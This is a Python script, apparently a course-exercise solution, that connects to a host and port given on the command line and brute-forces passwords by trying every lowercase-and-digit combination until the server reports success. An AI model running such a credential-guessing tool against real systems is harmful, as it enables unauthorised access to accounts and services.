# write your code here
import sys
import socket
import string
import itertools


class PasswordHacker:
    COUNT = 10

    def __init__(self):
        self.ip_address = ''
        self.port = 0
        self.send_message = ''
        self.args_value = []
        self.char_num = []

    def args_module(self):
        args = sys.argv

        try:
            if len(args) != 3:
                print('The script should be called with three arguments')
            else:
                host = str(args[1])
                port = int(args[2])
                # passwd = str(args[3])
                self.args_value = [host, port]
        except IndexError:
            print('The script should be called with three arguments')

    def string_num(self):
        self.char_num = list(string.ascii_lowercase + string.digits)

    def create_socket(self):
        self.args_module()
        self.string_num()

        with socket.socket() as client_socket:
            hostname = self.args_value[0]
            port = self.args_value[1]

            try:
                client_socket.connect((hostname, port))

                for i in range(1, PasswordHacker.COUNT):
                    for passwd in itertools.product(self.char_num, repeat=i):
                        client_socket.send(''.join(passwd).encode())
                        response = client_socket.recv(1024)

                        if response.decode() == 'Connection success!':
                            print(''.join(passwd))
                            exit()
            except ConnectionRefusedError:
                print(response.decode())


password_hacker = PasswordHacker()
password_hacker.create_socket()
